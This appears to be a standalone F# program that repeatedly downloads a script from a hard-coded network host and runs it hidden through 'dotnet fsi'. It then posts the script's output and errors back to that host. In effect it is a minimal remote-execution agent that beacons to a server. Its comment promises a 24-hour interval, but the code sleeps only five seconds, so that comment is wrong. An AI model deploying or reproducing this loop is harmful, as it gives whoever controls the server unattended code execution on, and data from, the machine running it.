open System
open System.Net
open System.Net.Http
open System.Diagnostics
open System.Threading
open System.IO

// Function to download the script content as a string
let downloadScriptContent (url: string) =
    try
        use client = new WebClient()
        let scriptContent = client.DownloadString(Uri(url))
        Some scriptContent
    with
    | ex -> printfn "Error downloading script: %s" ex.Message
            None

// Function to send output to the web server
let sendOutputToServer (url: string) (message: string) =
    try
        use client = new HttpClient()
        let content = new StringContent(message, System.Text.Encoding.UTF8, "text/plain")
        let response = client.PostAsync(url, content).Result
        if response.IsSuccessStatusCode then
            printfn "Output sent to server successfully"
        else
            printfn "Failed to send output to server: %s" (response.ReasonPhrase)
    with
    | ex -> printfn "Error sending output to server: %s" ex.Message

// Function to run the downloaded script content using dotnet fsi
let runScriptContent (scriptContent: string) =
    try
        let startInfo = ProcessStartInfo()
        startInfo.FileName <- "dotnet"  // Use dotnet to run fsi
        startInfo.Arguments <- "fsi"   // Arguments to run fsi
        startInfo.UseShellExecute <- false
        startInfo.RedirectStandardOutput <- true
        startInfo.RedirectStandardError <- true
        startInfo.RedirectStandardInput <- true
        startInfo.CreateNoWindow <- true

        use proc = Process.Start(startInfo)
        use stdInput = proc.StandardInput

        // Write the script content to the standard input of dotnet fsi
        stdInput.AutoFlush <- true
        stdInput.Write(scriptContent)
        stdInput.Close()

        let output = proc.StandardOutput.ReadToEnd()
        let errors = proc.StandardError.ReadToEnd()
        proc.WaitForExit()

        printfn "Script Output:\n%s" output
        if errors.Length > 0 then
            printfn "Script Errors:\n%s" errors

        // Send the output and errors to the web server
        let fullOutput = "Script Output:\n" + output + "\nScript Errors:\n" + errors
        sendOutputToServer "http://192.168.8.107:8000/receiveOutput" fullOutput  // Replace with your web server URL
    with
    | ex -> printfn "Error running script: %s" ex.Message

// Function to execute the script download and run logic
let executeScript () =
    // URL of the script to fetch
    let url = "http://192.168.8.107:8000/ARPScanner.txt"

    // Download the script content and run it
    match downloadScriptContent url with
    | Some scriptContent -> runScriptContent scriptContent
    | None -> printfn "Failed to download script. Exiting..."

[<EntryPoint>]
let main argv =
    // Run the script immediately on startup
    executeScript()
    
    // Loop to run the script every 24 hours
    while true do
        // Sleep for 24 hours (86400 seconds)
        Thread.Sleep(5000)
        // Execute the script again
        executeScript()

    0 // return an integer exit code
